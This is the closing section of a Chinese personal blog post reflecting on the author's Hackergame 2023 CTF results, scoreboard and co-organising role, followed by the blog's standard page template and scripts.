<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231105193156228.png" alt="总榜"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231105193239393.png" alt="完成情况"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231105193102796.png" alt="排名及分数变化曲线"></p>
<p>今年感觉题目比往年整体简单，基础的题目比较多，分差也不大，榜上瞄了眼都是群友，仰望.jpg</p>
<p>甚至没打过 CTF 的群友都能把喵喵超了，震惊！ <em>（当然 hackergame 和 CTF 还是有挺大区别的</em></p>
<p>这个时间段事情挺多，基本只有几个晚上抽时间来看看题，最后一晚上还通宵到早上了，太困了，呼呼~</p>
<p>说来今年题目的整体顺序也是按照梯度来设计的，后面几题主要是 math、binary、blockchain 的题目，难度稍微大一些，不过时间有限，本来比赛中还想做做 math 题的，但是发现这周过得也太快了怎么感觉比赛刚开始就要结束了……</p>
<p><strong>总之，和往年一样，比赛过程中也学到了许多！</strong></p>
<hr>
<p>另外，今年继续以 <del>你寄</del> 校队的名义拉了协办</p>
<p>不过可能因为咱刚办完持续一个月的新生赛，大家做吐了没啥人来玩 hackergame 了<em>（摊手</em></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231105193425037.png" alt="协办"></p>
<p>幕后工作人员都辛苦了！</p>
<p>这也是喵喵最后一年参与协办联络对接了捏，希望之后还有学弟学妹来接手，🐱真要跑路啦！</p>
<p>祝喵喵早日毕业！以及，想要好 offer！<em>（怎么就要成社畜打工人了啊，呜呜</em></p>
<p>喵呜！</p>
<p><em>（溜了溜了喵</em></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2023/11/05/CTF_2023Hackergame/">https://miaotony.xyz/2023/11/05/CTF_2023Hackergame/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特别声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="/" class="reward-img" alt="支付宝打赏二维码">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2023-11-05T20-40-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/11/26/Server_HomeLab_4_GPUtranscoding/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="HomeLab | 4 GPU 硬解新境界：LXC 环境下玩转 JellyFin 核显硬解转码">
                        
                        <span class="card-title">HomeLab | 4 GPU 硬解新境界：LXC 环境下玩转 JellyFin 核显硬解转码</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            在PVE里基于LXC安装JellyFin，并利用GPU核显实现硬解加速转码。本文具体介绍了相关配置步骤，大大提升了homelab观影性能和体验感。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-11-26
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Tech/" class="post-category">
                                    Tech
                                </a>
                            
                            <a href="/categories/Tech/Server/" class="post-category">
                                    Server
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Tech/">
                        <span class="chip bg-color">Tech</span>
                    </a>
                    
                    <a href="/tags/Configuration/">
                        <span class="chip bg-color">Configuration</span>
                    </a>
                    
                    <a href="/tags/Server/">
                        <span class="chip bg-color">Server</span>
                    </a>
                    
                    <a href="/tags/HomeLab/">
                        <span class="chip bg-color">HomeLab</span>
                    </a>
                    
                    <a href="/tags/PVE/">
                        <span class="chip bg-color">PVE</span>
                    </a>
                    
                    <a href="/tags/NAS/">
                        <span class="chip bg-color">NAS</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/08/08/Server_HomeLab_3_nastools/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="HomeLab | 3 下载观影一条龙：NASTool/JellyFin/qBittorrent 半自动化家庭影院搭建指北">
                        
                        <span class="card-title">HomeLab | 3 下载观影一条龙：NASTool/JellyFin/qBittorrent 半自动化家庭影院搭建指北</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            探索如何使用NASTool、JellyFin和qBittorrent等工具搭建一个高效的半自动化家庭影院系统，实现从下载到播放的无缝体验。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-08
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Tech/" class="post-category">
                                    Tech
                                </a>
                            
                            <a href="/categories/Tech/Server/" class="post-category">
                                    Server
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Tech/">
                        <span class="chip bg-color">Tech</span>
                    </a>
                    
                    <a href="/tags/Configuration/">
                        <span class="chip bg-color">Configuration</span>
                    </a>
                    
                    <a href="/tags/Server/">
                        <span class="chip bg-color">Server</span>
                    </a>
                    
                    <a href="/tags/HomeLab/">
                        <span class="chip bg-color">HomeLab</span>
                    </a>
                    
                    <a href="/tags/PVE/">
                        <span class="chip bg-color">PVE</span>
                    </a>
                    
                    <a href="/tags/NAS/">
                        <span class="chip bg-color">NAS</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: MiaoTony&#39;s小窝<br />'
            + '文章作者: MiaoTony<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者 MiaoTony 所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">482.9k</span>&nbsp;字
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
                        <br>
                        <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    var cnt = 1;
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var content_index = [];
                        var data_title_origin = data.title.trim();
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
                            cnt += 1;
    
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 300 characters
                                var start = first_occur - 30;
                                if (start < 0) {
                                    start = 0;
                                }
                                var match_content = content.substr(start, 300);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });
    
                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.min.js"></script>

    

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
